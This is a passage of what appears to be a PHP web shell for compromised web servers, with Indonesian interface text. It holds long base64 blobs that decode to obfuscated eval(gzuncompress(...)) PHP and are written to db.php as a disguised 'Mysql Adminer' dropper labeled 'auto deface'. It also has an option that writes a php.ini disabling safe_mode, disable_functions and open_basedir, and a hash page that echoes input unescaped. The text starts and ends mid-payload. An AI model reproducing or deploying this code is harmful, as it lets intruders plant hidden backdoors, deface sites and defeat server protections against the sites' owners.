cm9yZ0JCV3NUeGxnMjZNTE1LY0tBS3RJQW9nclB6cEJ0ZUpLL1VGckZIZEFqTXdwaEU0RGdUS0d3VlJreXA1aHJIMGJUWlJqVGRiQTdObEJmelU0MldCZklIRkZ1UnFKOUdYWEEzMk9HWEZFM1hEdlkvSU11VThXM0tadXRsU0pFZ0RyTVNMc2JxWjFzRGVUNGhhUkFxbnVGWWZSN3BkdHc5cmplVDhneHV6aWkwbUgyY0RXUlRuL3FvQnlUVzBNZ2FGMEdmRFMyOTB0R3Npa25DSjdwZ25UWldHUkJDbU1LT3FtZ2FlZ0p0cFN0RldITk1Ec0Z3aTFrV3JKbjRSQ21QMmVEQmJ3NmJVTXVzZzY4bEJKU1ByYWNua2tMeTNjcVJJcjMyZnNBM1NGejZSVTR0VkJ3eVdBZ3lRTmFTelRiUFRVQ2lGQUd0TTFXbTRJbDZHSVdwSFFZZ0YzQXJJQmpXY2t0aVdodnZhS3NMdGhOV1lpK0Q4Z2dtYlJ2U0UrN1RSY2xWc0ZRL3B4NlVmMzFpaEkzanUvV2I3WlBlRVQ1SW5vOXhJUThiWkFIV2o5WFZ4d2tmTG5wZ29VM1I5WFZ2VHlMWnlRNXBJYWg5SmNnWS96clExNnc0UWV5NkxCeGRuS0o5bUYvUWY2Y05JOGcxcXd4b3hPLy9aQUpMUmd0WU83ZllKckNDcUFyWXNaZEJndWxFSW94bWVVeTJ6ZDZRWFFkTGcyc2taSlZUZHZYRGlYdzlZZU5hUW9uK0ZCeU5RdlZVelNpV3h3M0NTYlFRakxMTGF6TnRsSE9OeC9RUzZRUjBSWmU1bDA3aStTOU9BaExqYkp5ZXpsYUZ0KzZ3Q3J1aUt2NFNpZDRwbDVjVDBoa2Eweko1aHlGbDU1T0UrZXlpZXV1aTdiRzR5VHJaOENkZGZYNE1MN0xubEdIWlZuOUhoaFBwNlpHaWZTRHp3UlhnR1NxSkxWYzd5bi9EY0dFNUdlcEI1dllFRUFMSEdOaDNaRnhWWTVXb1JOdFVRSVFaZUp1ejhNaUJTMEZXODJTeTZRbzNQcnBZeHJSN2xzZWdrbXBNbllPZTlQUVZKbTdQMHlFUzNHMm1xZFhJNFRLTGhTRXZabHRCMUxjUUpwOTNnbHVFYXVVaDVQeU5YRmNid29aOXE3cWNYMGFUcllEaW5vNWNGckpEczhjaG1zL21nSXlSNU9DTEdFV1lEeVUybmQ3d01CUXBmNnNvRy9neGdmd01WVG9zMWF5bTFyVU1iZWRDeWhVbzV4aWZJZ3diTkZrZWZWVUdobzg2bitGenplYk5wamt2cGpCUFAvS2ZBbzdhM1RDTmFVQmpOa1N6OGNlRE5hSHV4NWtWOTkrQjArSThQaDZlN0orVGFWRTNvY2ZQd0NKbXA2WE5nT25RR0JyQW5XalpzbE9wbTJVMVJSeWFzN2puUzlsQXBlWDd5RCs3aVJxOTRqR1hXUW9rV1VyZG0yNFBWR2xwb21DaVRaM2dnVlRXTGhkemZlZ2tZOTZGeE9XajU0QmFjekx3YnZqM2MvL0QrNEtTd1NEaktLcnJLeVhTNThkM0xoY3pWYVMvRlQ3TWllSDZ2bXROUGluTmFMdzV6T0lyS3BGMHc2YjBML05tRVJzck94UmlpUXViQmNqWXJaUDd1M3hUeXBIdWprTDk3bmNaZU5oZG5oMUlwMGEwb3FwSjk2RlBVWVdPNHE0NHdiR3gwWGkxMkNvVXlBYUI4aU1KNUJBb1FMaHF3aW5FM0pxZ0RPa0p4S1c2azczWU0zREl0QWJNd0luQ21FMUNHTG51WEdJZlJyb1Z1S2doazRwMEF5RkFFZUJ5T2trVm5KUml3K0I1UXlxZjBaVWdhaGxWd2VrQmcxcVVqcmVSYk1kcG1tZkNXN05KNXI4bEZXZTZ1T0p6SnJCdDdNNjFaaHkxZnYwd3FjVktpUytYYnE5V3FpODJlNVVOSDFVeXExTlllTDkyQmoyUHY0ekxxbUxNaVkzMUlUQi9Zb3k2OW52ZkdjdzkvYjBiNnJOaWVWN2luTzRvbmR3WnAybHV1Mmw4WFlEZzRKUnR3N3k2VDhrdm11U1hzczBQLzlmTHRMcmxCd3grRElXRXYySUUrbnFBckdzVzl0RmdoYTJ5cW1xNDhxUGkza2s1Ym96SUJOWUw4R0tNYXlpUlRWbFhKYUNhODIrdURuck1DNmtGT2UzbG1heS9QeTdVWFptQ0pjbUtMbmkrc1hKdTl5SFdjbUhuMXJhalJaTlVWdTNOYWVkbVR5WTFDbXpMci9mdlI1NE00VGYrRFRCYm9GM3hjZFdISkNHVnFLRFhMYUVMV3hDVjlCNFhCYTMzWnJRTUwwYWhDOXVtZUJNYmxCSm82R01IR1lLQ3hNY2xGMVVIMWU5UWp4ZS9uendoL0t6RFd1YmkyaWpxcVE3TVQ5RUlTVnNsVkFCS3ErdEY0QTM3NkVVaU1VZGx1dHJXczNjV1RGaUJ4eDFrK3haZDFaTlZXbTFzTmVsMGFvYmtSVjJFVThHS2RiRkd6M25vQyt3cnBmdXdyK0lVaTR1VStWbUtqRUJPMFBTVFZGQSt3YTJFTEpVTllMVW4xb3czSS9oOFF2SUgwVU5GM2xlc2EwMGgrNVhYaTIweWtocmtXZ3ZSby84cEdDTENrZC9xeFV4ZE9QNlNmcVZPcnE3TW92T3VvZmtCdUdnZno2b3BCcThtYmtJYlFJdmJQTlNWbm83L1IvK1hzdjZyOVgvb2J0Y0V2K0dzalFJSUNmdWhxSkttdzN0eWpuV2cyZzVySTZINnk5dCtmWVJSdXEyZjlxOEZhalJPUWkwaDA5WHFGNnZsSjRVaE9GWnkxQmh4RmY1dmRPQ3Q2aHNQV3Bkbi9iVnZQU3RXYTVvYWVNeHg1QW90NW0zWkhvMjVWcGloRzJUMzYyc3daeWszcy9SbERVU3NZaDFvSnRuUWxTS3l0VVR5YVpJRzZpSUhsUTc2ZXhTaUEvd0V6RE9SUEhoRHpDb0RBMWp3Y1gxcklnT0hDQjVrWFJsZXh0K2hSTTJDYjRhRExYb1VSUTdXYWpKK2tqanNaYVNWbG16U1A1bUhoT2ttU1JHT2o5LzNibUFKYWFaTkJDNVZScXhBZUFiMlJjUkVnUEdHWEFkbXREdGxVMGpydnZ6dE1Rc0xuSWlYRTlzR09VRW9JdEtDQlFZOW1RTmhQTUJ6UGZDODBLREpLdjZ5YlUwSDlrRlZReWw0OW54V2RNcGVaZGVUWUo0T0FYV1hBVEVLcVhHZGwvc0pkZ0w3REdaZkJQUEZuOTBlODQ4OFFyMjN1QU5jS2RzOHlKSWMvbDJTTm9Mem95T3d4bTIzY0tJeEwzNXRPeVFuTWU0QWlBOXVUS2hCWUFKc1lxMnhlTEJXMXdnNTJhLytYMjgwdGx3UkhOWnljYnA5K2tENTY0c0NRNVl0TUVFbDBvM3VwTjhTVGJuVmNVdWFKbHN0U1JlbDl5V052b2JRU2E1STB1KzJISERrdnI5Rm1tbVNsVEoxalNGckFPU1M0MndHTmNiUU1kY0JkRmlMTGg3VTFxNnRzT2xKQ0xnTzdCeFplblczTkRoMmwrT1hkbzNuSDd2RUFKK2VEdldGM09IMjBrL1J2WU9ITmduTWd6cUVHV21tVmtkRjBKVUhycGxHb1ZGaTZwRENLcmxGMmptZkIrTExyNkFzVUpFR3BJVnFMelRpUmNKZklaK0l3RjcxSVppQUxaVzloYmFRK1hmNHZsTEVLblNzakVTWVB2NHdWTWVudGh1ZWdWeFR4UjdPWmw5MnRiMWM2ck5UYXNjUGdUQ1R0djVONW1CdHRheDcwTXRIeVpueDVJdkRTR3VpWm9NVHJtWHRBTng2eDdTVmpmYy9ERklNbGUySms4aDkyYW1Uait4NG5SM2w4dWRPakU1WDhOcXhseDBobExyeU1aQ3gzTHBaSndqc2hyZVgwQlVocmNXVWhWeTB3VTVXWDJwZGFvaFplRnU2MjZKek1MQ05saFdld3JuQ0Rua2FwTjVOaDRtM3RwY1A5NFk2VzBjWlVYcTczaDJLeDhRZTREYzBkOFVvOGhXMS9rNXdHZDdwZ1NjRldYZXc3RG5mUzZXZDlEVmhnSTM4SnlKOUxNRXVhOXgwVDhtOWRJV2oxSFhYOVFLMTZ1azBnVGdBYVJScmQwYzc0TXZvT3BjekZCQXdVdDFBNkRSbVozaWgvSDhJeDcwTVk0dWdMZ2hUeUVWTFBtOXlJSE4xUmFpcXdHOFc2a2hGZGhiRm5YM2JadmFiYlFXelFZK2dWaldRLzYxeHh5bUpjNnBuN0VvV0lGeHdYNldxaDZ0UFlzaSsxcm1ZcGpxOExzZk0vL0NDaitFcXVlb0VhR0UxdStJWWRYL3EyNDZoMDhCb29vd21IZ3RIZE5YZHJFbnhTM3JpUzY3dnl3blB1WnFvNkJteXBxNmQ4MzVOdVo5Sm0wZWE5b25ndDFTSHpnZSt1UTBNNnVoa2IwQTVsV3Bpb3QzRVVYUVkraGJUWEJic0E0ZmNzbUpJS2l1NE9rSm5CTlRwWXFFL25zMmdFeTdSQ0dnNjZRZFNUQm5YOU1rdUhJLzA1Um9ocnY1SVZ6bHltQjluMG1JdnIxdlF0QUVtVGY3K1N2OXU1aXBqSmlpZnNzL0tTbWZVaURQMGVIaDBlbjZJVzJoVlBuejZ4d21kQTJwZDNWM2RpamFqVzg2MzFVRkxuY3lmUjNBTWxEL05sV3dweGpPeENrbTRqUDVhZW8vRXlMdmlRK1BFU3kvMUVSaXZHWDZHZDBOUFZHVkFGVVpHSkVFMm45RFNQZUtiaXE4aVhPUGFER2RmZU1MV3RtQzVDaXNDTWt0NlpZQzlhSmNYM0hMZ3c5OXdEQTZrZWlIVWhxWnRhcW1oTlZMSWdHQ2tteVJPYUxUbWhDdlZhV0FkQk90bG1RYzBxQXN2U0dtQmdFbzhmaTlLQ3hNWnZZaW5Wa1JuVktXV0MzVC9tSjFvK1VaRTFYOXNrUlllUlN5cllkVnRPWmFaRHRjaHphSHVMenN3Wmkrd0podnAvUmJBTS9teWhrdk11aUJQV3cxeTVQZzFwSlBqMTZOMkczWWtXYkxOSTd5ajJQOW5rdEZzTitVT3pRTUQzVnBjR1FGVFUxVzZMT2VpaUNYQ3hhK3dnUElLR3l4aS91ckdJQWh0NHhwOERibVFuUHpRTmUyelVLSDhuTHExcExoMkEzS2VnTUQwbWVHUE1vaWErdnArRWc4bnNlNGxOSnU4U3R4TFl3VVh2Q0t1U3JxWkxaRkFqSVdCbXlZdnhCaVFuSldjUjZKK1lYNldSZlhYWFd5ZXNkc2gzUlhETC9LY2ZUN3pRNjd6WmZ2djdyOGVISHc1MjJ1TG5kL1JQUjc5NThoSjJ6dkozUmZCcGtlekxCSm5EVnJMenRTT0FicTluYnE0WG1nSHpHVFFpdkU3ZkZzcTlhbHZ1QzFtcURIYVRKZ1hMMmVSYjgyVTNwQmtCNlVIYTNpUFdGV3JrNG43Mk5SQWZQMm1sUlQxb3M3SGhoeE43R0RMNmpIL3RqNWNwM29tYytqcDZ3R3hRd2hTQU5GUzE5TE9GV050bFQ5UnIvQ2JvT3FKUVIraUE2bitnVTFVNkIxRUZXa1lYRUNZWC9tdzJ0TkJLSEs5TkFiZm9iaXczU2VyUFZjTXlMMCsrNWpLTlJPRUhJSG82a2QvdlljOGhaZ0x2cEMvM2JwSTQxT2xGdkN3bnFrcS9sZXpySUJsQ3pXZ1pqL0dhS21KWThFMWQ1THNUTzdWYVlSRFpuL2pvOWRTUGNITzJBQnA0MFRmR1FQZkt0TjVxYnFvenpkY0xkUS9XYU5acW1jZXNORmd6Q1BDajQzMFJLK1VsdmFDSFBYbGVPVlNNZWlicDdCSU4zeXhHU1U2LzIxaXVyNlZwekdOc0w5OHRReW5CZm55OG5kdFY5NU81RkM4b005ZW5zRXdTaEtpL3pnVjJFQUxpYnZhUzcyMmU2TVFmTGM4NUd0eFdpUFZicFBkK3ZUUkZnMWNDZ3A0Mjh1TWhMbEF2QmFXaTdERlQzUG8xbFZvZGpFbXQzQi9GRVY2SjgzV0FpMElOMjJBQ0hRd24xYVRtbXFmdFRHZnVkWFd2aTFlWjFTdFYrTTB4ODExKzNrRmZqZ0hsT2J3MFowVXlOcitxdzkzYkZKZUpOWXV4K1RVNyt1Y3R5Tmd3b2tmUUVBTmVqK1o0ZTQ3Rk43NTQ4MkFmamp1UjUvY25yR3REQXFiMmloaGZzblRDeXd4dGZVMWJSWXZUZlcwNnlTNmpteU85NHRxQWl1VlhyQXBDNmFxM1RyNzFhd1Q2R0JndklhcmJoK3JXb1Z5L0ZISjBTaStId2ZZRWRCSVdFaUdiMUYxenZ5RUx3a2QyeWNyeThTekExOGxHUWVqRk54MUhNYWl3eWpHM1pEcXBoMVVmVitpM2RmZGVIVTF3dnYzQ3E1Q1o3S2ZseThyeWVCK3p6eXFYQS92SjFrODFXNDBYRWp2d0VkOFp0dEZMckhUeUhpejBtUjFEWkZVVHlpdnBqbjFRSnlVd28xYXY4NVhGS1NuQVRnYk9QdjZYUi80Yys0TTh2a2NWZ2VmMURydWwrT2M5Sy9iVGZNVTdrQ2lHeUt5Q3dFVkhseTMwUnVkalcyWkRjbTN0YjV2ZGJwT3VIT09UUDZRSjRpdGtaZElIMXNrUmlQZHFoUlZXZWt4Q1ZNTG9pcDVOMERFdE1vUENRQm95OUVQbkNhdXkxTTVOMllxbm5qV0p6bXJvalkweWFJcFdrU0VxTXJzdTFzR1N4VmVrTm9wdGs1LzRrblIyeXNtQ2NxWjhXREJiYkU3UVJrZ25nWHBUS1hhRnpoVGwrUmpEYXg4dyt4RTJDWmM4TFdPSU15eGFidzNxbWZTbWVpYTFzbHpJemdSem02NUVMM3Rtb0ZZeGtRSHNTY1k1NVJ6QTU1NHFuN3pZT0VkMDBJajlnTFVHVWIxVVVGM1J0Ri9sY2c4aU54c3Rhd0JiR2NBLy9DUjdpOXpTYTZDQ3BSQmtHd3pmb0RFc3d3UFZZTFVvcGg0aWVnU0U4aXFoQnFmRmdvUnhyY2lXTWdXTEJzWmVxWWdtME5qSnZ3ZHBzTGRHY2M4MUdtT0Z0aXJMZy9SSXFaSzhONUZEbEZIWjdXeDJMSkZheldpUnFKUGJvSzB5L214bXBuZXpJRGsrbXRaTG1HSjdDcFhJZ1h1RGFwMDg1STU5WDI1aFZGQ29ZQjBQMDhtdzNHNHBnZTZMNW9zbkw1NjJYbTdLTngza29USTVaQ1hRaGdVa2ZvRUV6Q1BNYTRvR1dObS9qdXhwWk9GOSt2TFppK2QzSWlXSUlzYjNxekIrb1kxbHJmdDlsSHUvVngzNzAyK0VlSE9UeXZsdEpqWVdLa2FTUTE4Yy9YYjBuOEZDUHFCWHdkTk1EcUZSWE9aeVVLS0N1UGFERk5LdkN3YlArWi9qYUw2STZhVUdBa08vQmxUaEpUeSttdWhRY0tNZElNYWFvUGR2OE9veGhTd0VNU3BjMENYMTRDeVdkT2tzVmF6M3hLOSsrZzR5OXlHVDYzYzJOdGJXMThUNitzK1BmMjYxbWkwNytFY2pKbDJqMjBOTlEyZWVEYnBLdEgrcXEvZGdFZU5heTRyeHF6N3k1NHRVdGZYeDQrcWpYUE1oSy9NNk0yWFdRTStDRDlsQzdvL0tZcllvWnNqcHF4cFY2elZybjFmMVFEK3ZiZFFzZXByWkZGQnMxcFFmTXdTRFNKZ2lrTXV4bTFNYzJOaERvRW1kRHBod2J0allPdW9KSklLNWMvd0tiNUpuM2dKWG8rZE5KdStveGJJUmRaR0J1eldSM09zOW1JZ1VHaUtyVWs4UnFNREcyNnlva3R4ZUtab0tNd2lmZzBxOU5CaURabWk2cUlmUHVwbUVHeDd5TlZ1bUxrelFFUjBzWFI4UGN4RGdvcVlsRXBZOTZvSTZRd2FMU2pWY0hyQXVJaE80dHphNHNDTWZ2ZU5Xb0kwdW1aSnBQSm5qRlE4bWNtV3F1VWZqcGVnWEZIblAzbXhvdmVPNUtkaU1ndjZ4NDQ2b2RBenJBaHRSWG9xdldtdUlybkQ2MTgrYS9ldW5vLzUxOHhuOC94eitiOXIvTzZwaU5Kc01wVnRieU5nbmE0U1dZWEM5dVJNbHAyZzhWekFsemVhbWRQRkRTbW43ZGprQnZFSnhnNmZqb0xxMjliZUdNdGZTRkpJejl3WSszQUVlVWZ6OVpaNkVMcVdHSWtBbld6ekhRM0xKbmxhK2JPTGQ2S3E1c2d2WWJoTXFWTEZmVnIwZ1hLTGtIcFNVc1gxdnltN0Z4b1pBajE0d05WcElXZmZXWmZlMnRzVG1zNXI0SzhzRDdnYVd0WXBsM0Ewb2JNR205OWRQUDFiTE9vTEZKWFYxVjZDOFNOYjBwdGNUcmVJT3J3VUdUbE5VZjltTXo4NEhLWHRXYXY5S0NrMWt0UW1vVS81MVZTNnA3R3lqT2NKMzlQMXJxdkFEL3RHV2F4YzJWRVp3OW54Z3ZsOE1mdnF4a1N0L2FwVS9LeW5mdE1xZmxKUTNyZklXUFVXT3J6UzR1a0c0MGdoY1p3QUdweU9EbWVNZnNndnhDZnovMUpGRkRTcHJQVldMMGVTWkJXcmx2Y3psYVlwOFdSb0dhY2d4eW5yN2hGSGlUU2JHUHo0RFA1OXNXcmwveWtmOWpLNWdWOG5oK3JOUVRXN1hhdGYraytkRXM1NnJBalA5YWEwT3RnODNITjJhQzI5OFdYWC9pYk1CMnJTaUFPbVhGOG1PRmdvL3VZYTIzakVMRUUwcnQ2TGViWkZKYXZIL1JUdXRUVmRLZUk2MG5NWmtPZnBYUTMyUUxIdWc3VDI2QWt4TFE5YXNxZmRGSnJFL3pzbjVGdnkvU1ZPRVN3dXp5YzYySnQ0OW9LM3BwN1B0R1doeVM5aFdXcVk1VjFacUQzS3V2RERPWWhWVTgvK2hCRnY3WkhObGtSNTNhNVBOS0dGV1BrNUlQUld5akZZVFZkVlMrenhQSTRJckduQ2tvK2s0Wk43NEN2UEttcFBjQjhETUNrUXBxQ0pzK3hMNFQ3NElYYlZod0RNNlNjTWVRRkJ1OGNTamdMZDJiN0FmREpmVmRKQXRzSkRZcFNTUHNDZ3p5MHRjQ3RuM1NPa1h2VVhhVmZvSUJiY3U2Y1pCK2Q5WWtUSFUvUHlzQlk5cktmUFhWbVFrZVZWQ1RqRUNnQzZYZEZ2Nk5reGlSYlRMUDVKaTNYUjE3R3ZDQkY4ZWw4Nm9hdGJMdG9aWXZsdll6THA2c3RmNmd5TzZjVTExelROVEJXWVlrem1qeTVBRGxjS3JsUU5IdmZva1RUZ3VjdVFWYlVmOUVhRWN4cDNkZDlzZjlrK0ZLK0VsK01CMXJDdG5YQ1N2anFNMzBQa0QzK1FwdzZmK2drMUpkWGtGbk9xWFY1YVFCRGd3Y3djOUpaSzdNdnpLSHJIZmQvOVlQVjRjcWxVeVdvaEVjdVNTVG9Fd2g2NjlEL2tQcWlqTitWSzlvKzhjSGUrOTN6Nyt3eUdqaHFBUG9uQUlDdFhIcGM4UldVMGJvZlBoWU84ZkgzYi80cVRtaDIxU0IvaFd6eGtEcVBISjVHV01rTnQ4S1FzbmFzbmJhTGFjaDZicGttdlVTOXJPK0J4MFJwYlVwWG9taWlvbE5icWRLWjlYQmZTMU8yWXIxc0hhU1ZkSkw0V2w3dFFkOHl5N1pGdlhZbHZwaUFzaGkzRVlSVldqcjJXWGh1Mlo1dFkzNjgvcDZxVGtzbU56UGd2NW9yWnFMU0ZKMmRBOFpmV1VaclpPSC9iTGZzaWNzQitFbmw3RlFVcUhxblZUSTNzUmxuMmF1bEQvbVRoNUUyWEZMWHRIZWI2MW5DcTVzZ2NZN3ZlU0FRS1dDTmppUzhEeTdkK3F3NW9RVVNMWGpSOTMxMXNsY2xUU1hsdkx3RzZabHQ5SEtqYTZlSmp6SlpFbzBjZ24wdkJtZUlabXVaalRFc2xnemdLNGpyclZtNHk5aGErUDNFcnd5d3R4dDJXVHF0YjVmcE5ETG1FMXZDdFE0bkZiQ1RKSFA4eWUxVm1XVUFzZk56YWU2aVh1M1J3bGdBVUZMV2VoSzBpM2ZCbzNIT3ZaZHcyWWp1alZRQk9IZi8rL0hQRjB4WFdsMnd4NmpteituTGwxN2hZYnJPT3EyWHptT05pdTY5Ymt0WEdPSnFMWDdpdnkrZno4VS9neXVydVNmMitmUGlpVzJ5bW55eSt6VnJ6NDNFanVHaC9YbnAveEs2OGtzKzFrRHhUZlY4S1JRZWhVaE4rRHZ1UGdoWGFaRHd5RWpJNUM1Y3U5Vk9GUzZWZTVkRnY5QVF2S3BXZGdCN1IvMldrdytURkF4TlhZK1NrN2cxMmxYMlhUZER5REx6d29NbHpLYjh1YTJpcjlLcGR1NHhNTHdDOGRhMFdsNnIyNmdYWFBuMHFJNkNBWG5FOGxsQmhZNDRhWnRFT3FQMnVReWRIRGlabVVHSmc1d0tSUW40SThNeGo4U1Z3ZFVDaS9mRHZBZnFIQitiZHJwbE1hNDJNOVhWaWNxV1lnOU1PRDh2RVNsY2Jwb3I3cFZsWU91dUU2S3BMMElaTkp6YUhTbVpCNWo5RG1zOWhTZjFJd2QwdWt5TTh5cnV0TzlaeWl2NS83eFM4MERvcFJIVmFoZGVrNjk0ZDdlYUdyWngwSFhWSXo5Y3ptK21ha29ReXZvMGh3aVd4cmc4RktKbHc1Z3ZKNjZqKzZSOElrVEtkTEdhN2VUYk9sc0g0Y05qZHorSS9zRUJhT0w3WEZqTTZCbWJQUWYyMkhpdVM5VWd0WTUrRFJuaitiR3FGRWZ5ekNua2dxQTZTbi9Fc1NhbUZRU2twUVd3Q3lmbXlJeVRTMEN6dldjdVU5RzRxVHZkOHFsZkd6TXBkVG1DK2piR1UrcC9SYWxlM0w4MSt1QkR0Z1N5MHZMWEZMSG9VcVc5OG96MHRXdDJRRDN1S3kyU0RUZU9taWFaZ1YwMjAvQXlYVFhiSDU3SnQzaXFKY3p6MEcxS2ZYZ082OWtMRUhXczdDTitaaGUxVWVmbXYyczN6c1dZSTE4eXpRb214M1YzZXhNSlpOdjhqUExOVi9Qa0RseTFmV3pTdVJoVWQ1MkVDRXdlV1FkZGxMbmU2dmVPWHdoSlBtU2NQY0M0VGxUVFk2MHlySUJYVEtzMjkxTFdLZndpNFdvQVduUXlxMTdscXBVa0x5dnk1QjhBdz0iKSkpOyA/Pg==";
        file_put_contents("db.php",base64_decode($script));
         echo "<script>alert('done! check db.php'); hideAll();</script>";
        echo "<p><center><font color=green>Check = >> <a href='db.php' target=_blank><b>db.php</b></a></font></center>

        </div><br><br> ";
        die();
        }
//create php.ini for safe mode
        elseif ( $pilih == 'phini') {
        $byht = "safe_mode = Off
        disable_functions = None
        safe_mode_gid = OFF
        open_basedir = OFF
        allow_url_fopen = On
        code by = zakir dot id";
        file_put_contents("php.ini",$byht);
        echo "<script>alert('php.ini Created'); hideAll();</script>";
        echo "
        </div><br><br><center></center><b>
        <br><center></center> ";

        die();
        }
}
}
elseif($_GET['do'] == 'hash') {
 $submit = $_POST['enter'];

 if (isset($submit)) {

   $pass = $_POST['password']; // password

  $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string

     $hash = md5($pass); // md5 hash #1

   $md4 = hash("md4", $pass);
        $hash_md5 = md5($salt . $pass); // md5 hash with salt #2

     $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3

   $hash1 = sha1($pass); // sha1 hash #4
        $sha256 = hash("sha256", $text);

   $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5

 $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6


    }
    echo '<form action="" method="post"><b> ';

  echo '<center><h2><b>-=[ Password Hash]=-</b></h2></center></tr>';

   echo ' <b>masukan kata yang ingin di encrypt:</b> ';

  echo ' <input class="inputz" type="text" name="password" size="40" />';

   echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';

  echo ' <br>';
    echo ' Hasil Hash</th></center></tr>';

   echo ' Original Password  <input class=inputz type=text size=50 value=' . $pass . '> <br><br>';

   echo ' MD5  <input class=inputz type=text size=50 value=' . $hash . '> <br><br>';

echo ' MD4  <input class=inputz type=text size=50 value=' . $md4 . '> <br><br>';

echo ' MD5 with Salt  <input class=inputz type=text size=50 value=' . $hash_md5 . '> <br><br>';

  echo ' MD5 with Salt & Sha1  <input class=inputz type=text size=50 value=' . $hash_md5_double . '> <br><br>';

    echo ' Sha1  <input class=inputz type=text size=50 value=' . $hash1 . '> <br><br>';

   echo ' Sha256  <input class=inputz type=text size=50 value=' . $sha256 . '> <br><br>';

   echo ' Sha1 with Salt  <input class=inputz type=text size=50 value=' . $hash1_sha1 . '> <br><br>';

   echo ' Sha1 with Salt & MD5  <input class=inputz type=text size=50 value=' . $hash1_sha1_double . '> <br><br>';



}
elseif($_GET['do'] == 'base-coc') {
echo'<center><br><br><h1>DataBase SQL
<form method="post" action="">&nbsp;
<select name="pilihan" id="pilih">
<option value="db">DataBase [Mysql Adminer]</option>
<option value="phini">Bypass php.ini</option>
</select>
<input  type="submit" name="submites" value=" >> ">
</td></form><hr>';
//starting
$submit = $_POST ['submites'];
if(isset($submit)) {
    $pilih = $_POST['pilihan'];
//auto deface
    if ( $pilih == 'db') {
        $script = "PD9waHAgZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZU5yTlBXdFhHN21TbjJmT21mK2c5UGltN2NFWW16eXZqWjJRUUdZNFE0QUw1TjZkeFY1djIyNURMM2EzMDkwT01CbisrOVpEcjM2WVFKTGRjK2NCTGFsVUpaV2tVbFdwSkg3NjBZL2pLQjdHL2lLSzB5QThyNzZvZFg3NjhYWGlwOE81ZHg2TWh4K1hVZW9udzNnWnBzSGNyemF4T0JvTms5U0wweW9tS25Nc0VGM2hYeTltMGNTdnVzS3RpM2t3amlPcVVTTWdncGVBWE9Pc05SQnI2cnM1QUtDSlB3MUNxSCt5UFR3K1BEd0ZMRWxLVFp0NVk4anU5eUhIM1lBZmt5QU9QVUE5SEw3YjI5OGREbXUxQnVRam5ZME5oV1R2WlBpdnZRUEdBZjlWajM0N0doNmVBQUxNcllsWG9pWGFvaWxxRmwxZFpXZnZlUGZ0NmVIeEg4T1QzYVB0NDIzNEZOMnV3QmJrNE44ZXZnZjQ4Y3hMa3FGL0hTUnBVblV4YnlXQlg0L2VRb1h6UEh2UEYyUEpxRW1RREtmTGNBeDhRcWp4OUh6NHlZdXJMdVI3bzVsUFpXa1FoVW0rS2REQnZZTjNoNEM5K3NpUC9mT2c2aXd1RmtFNGpaeTZ4bHJMTm96R0dRZGdPQXZtUWNxais5T1AweWoydmZGRjFZdGo3NmJxRG4vZGhjRndoMGVISjZmUU15OFJGUmlWajBzL1NXdmlzd0d2Nkd5R3VmUnZSTGNISDUrODJkSW4wR0FxcWxUd3VYa3JIZ0ZMaDY3T1orNVFVbFlCSGlSRGJvUkNBdTI3aFhLSlhPSG1YUDVQRWhsZmVESDBqc1p0bVU1Zk1wMEwzNXY0Y2RVWlIySHFoK242NmMzQ2I0dlV2MDQzTHRMNXJDTmt0UzVVV1gvcEVEbmh6eEsvZ0hNVW5EOTdJRTZzY2hmSzg5SGxBekZDamJzUXpqeFkwcTBINGd5U2FQM2x5MmQvWDk5MEpMZHgrZnF6S2JIN1pQZjRuN3ZIWnk0dXA1UGQvWGZ1QUNaVWFYYmJ5ajU1ZTd4M2REbzgySDYvNitKS3IrQ2NBNUV3WHdCU2xoSTA4ZVRZVFNLUVJNeGxiM3k1WE14dmtvOHpWengrTEI1VkV1K1Q3eVhUWU1ZVGFqS0NEb1ZRWlhRUkpXbGR3TWN5OFdQNldNQ3FwQThVRnZBaGU4aGxJTzVvdmFXNHFxQVZOTTJHMDFtd3FISWVsY1orc3B3Qk04WEhxblB5MitHL0JCVWx4QmxzNmlNSlVST0xxcnQxc2Rsekc5VFlJWW5WS3NpbHJRM01KV1RZYUd3S29CdDVDWDFXRFk5K096MDlHdjZHUzJ6UWNJZnZiMDcrc2QvQWJtTlZPWGp1V3psNEtRMmV0MWpNZ3JHSDBtQmpHVjZHMFZWWUNyMFRKSXNvQ1JBT0txVXByTlU1NUhlRWFsRFhiZWpHc1VqSFBreTgxSU9tdWk3a1hGMUFNYzZ1SmZUckNuSzVsMU0vSFYrb0ZTbzVvZGR6a0FDekpUUFBaRTBROUFPR3NHZzBZSm5ENTNLK0lOaXFnYTNwaGMzMHhyTW80YmtDd2paVnN4UEp5VW5UN2JxTWwzanhXUTBTVHdHbUN5TXpUODZ4WTBjem1FbStDTUxGTWhVTTR1ckY5RDBtRnhGSHhxcTlRWFo2UnRNMzM1elRDNTlHUk54RVMzSGxoYW5ZZ1Y3TUltOUNVL1FLWkdvWWhZUUpSaS9iMHN4RWhjWHFqMU9CTlllSXNPcmFkR0dLeU9sclppOWdnSG83eDRkSDRuVDd6ZjZ1MkhzbmR2OWo3K1QwUktUenhkQUx6LzBaMXdLd3Q4ZTcyNmU3RWxBWGk2cVVMR0wvOE9EWE4vdUhiOFRCNGFrNCtMQy9YOU5WOXcrM2Q4VE85dWsyQUwzZDNoZXdZY0VHTGx5bjRVMG1DZXlpRjM2T1NRM0hCYWpUd3dLNWQzdTcrenNuNG5UMytQM2VBYlJuUjd6NUE3WVRMaDErTmhMbWR1aEgwK0hRRmJzbmI3ZVBKSndyOXZjT2RoOVNuZnRReG1mVjcya2N6VTBEVlpjdHBtYkxjQnZqdGZSNjlXSXlZaWE2eXMrWGZSaGZuakJURDM1T1JFNzJaQ2NJQXFJeUFEVVhYbnFCbjFsTzMwdk1YSzlMVVlIMXoxellQZnd3Z1FKMzhFMkNoN0Vwb1poQjVteVB4LzRpWGQvM3cvUDBvaTJjQm1oelVMdGFrU0tDcE1INEloSXl3eElPZ3Y3OTZjZFhQUlFTVzdqUDlmQTNZTWJmY3grRXowV2FMdFpCYXdrK2RaMjMxdDdvcUhIdE9pczJYa1NSQnVuTTc3My9BNFQxMWdZbklEZEpiMkJVa0h1eThqaEpFSHdVVFc3cTZlVHpGREMzUld0emNTMjI0OENiMVUrOWky